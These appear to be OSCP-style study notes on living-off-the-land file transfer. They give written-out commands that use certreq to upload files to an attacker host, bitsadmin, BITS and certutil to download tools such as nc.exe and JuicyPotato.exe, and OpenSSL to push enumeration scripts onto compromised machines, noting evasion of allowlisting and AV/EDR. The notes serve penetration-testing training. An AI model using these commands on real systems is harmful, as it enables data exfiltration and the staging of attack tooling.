## Overview

LOLBins (Living Off The Land Binaries) are trusted binaries already present on an operating system that can be used to perform actions beyond their intended purpose.

They are useful when:

- common tools (wget, curl, nc) are unavailable
- application allowlisting blocks unknown binaries
- AV/EDR flags known offensive tooling
- minimal environments restrict installed software
- you need to operate using built-in system functionality

Two key reference projects:

Windows:
LOLBAS Project
https://lolbas-project.github.io/

Linux:
GTFOBins
https://gtfobins.github.io/

---

## Common Capabilities

LOLBins / GTFOBins can often perform:

- file download
- file upload
- command execution
- file read
- file write
- reverse shells
- privilege escalation primitives

For OSCP, the most important use case is:

file transfer when common tools are blocked

# 1. Upload File using CertReq.exe

CertReq can send files over HTTP POST.

## Start Netcat listener on attacker machine

```bash
sudo nc -lvnp 8000
```

---

## Upload file from Windows target

```cmd
certreq.exe -Post -config http://ATTACKER_IP:8000/ C:\Windows\win.ini
```

Example:

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ C:\Windows\win.ini
```

---

## Output observed on attacker listener

```
POST / HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client)
Content-Length: 92

[file contents]
```

---

## Notes

- useful when HTTP outbound allowed
- useful when PowerShell restricted
- sends file contents via HTTP POST
- older versions of certreq may not support -Post

# 2. Download File using BITS (bitsadmin)

BITS is a Windows service used for background downloads.

Often allowed by default.

---

## Download using bitsadmin

```cmd
bitsadmin /transfer jobname /priority foreground URL outputfile
```

Example:

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

---

## Download using PowerShell BITS module

```powershell
Import-Module bitstransfer

Start-BitsTransfer \
-Source "http://10.10.10.32:8000/nc.exe" \
-Destination "C:\Windows\Temp\nc.exe"
```

---

## Notes

- commonly allowed outbound
- uses Windows update-style traffic patterns
- reliable fallback method

---

# 3. Download File using Certutil

Certutil is commonly available on Windows systems.

Often used as a wget alternative.

---

## Download file

```cmd
certutil.exe -verifyctl -split -f http://ATTACKER_IP:8000/nc.exe nc.exe
```

Example:

```cmd
certutil.exe -verifyctl -split -f http://10.10.15.190:8888/JuicyPotato.exe JuicyPotato.exe
```

---

## Alternative syntax

```cmd
certutil -urlcache -split -f URL outputfile
```

---

## Notes

- widely available
- frequently used in labs
- may trigger AV alerts
- still useful fallback

# 4. File Transfer using OpenSSL

OpenSSL is commonly installed on Linux systems.

Can be used to transfer files similarly to Netcat.

---

## Step 1 — Create certificate on attacker machine

```bash
openssl req -newkey rsa:2048 -nodes \
-keyout key.pem \
-x509 \
-days 365 \
-out certificate.pem
```

---

## Step 2 — Start OpenSSL server on attacker machine

```bash
openssl s_server \
-quiet \
-accept 80 \
-cert certificate.pem \
-key key.pem \
< /tmp/LinEnum.sh
```

---

## Step 3 — Download file from compromised machine

```bash
openssl s_client \
-connect ATTACKER_IP:80 \
-quiet > LinEnum.sh
```

Example:

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

## Notes

- useful where nc is unavailable
- encrypted transport
- commonly installed binary

# Cheatsheet

## CertReq Upload

```cmd
certreq.exe -Post -config http://ATTACKER_IP:PORT/ FILEPATH
```

---

## bitsadmin Download

```cmd
bitsadmin /transfer jobname URL outputfile
```

---

## BITS PowerShell

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source URL -Destination FILE
```

---

## certutil Download

```cmd
certutil -urlcache -split -f URL outputfile
```

---

## OpenSSL Transfer

Attacker:

```bash
openssl s_server -quiet -accept PORT \
-cert certificate.pem \
-key key.pem < file
```

Target:

```bash
openssl s_client -connect ATTACKER_IP:PORT -quiet > file
```
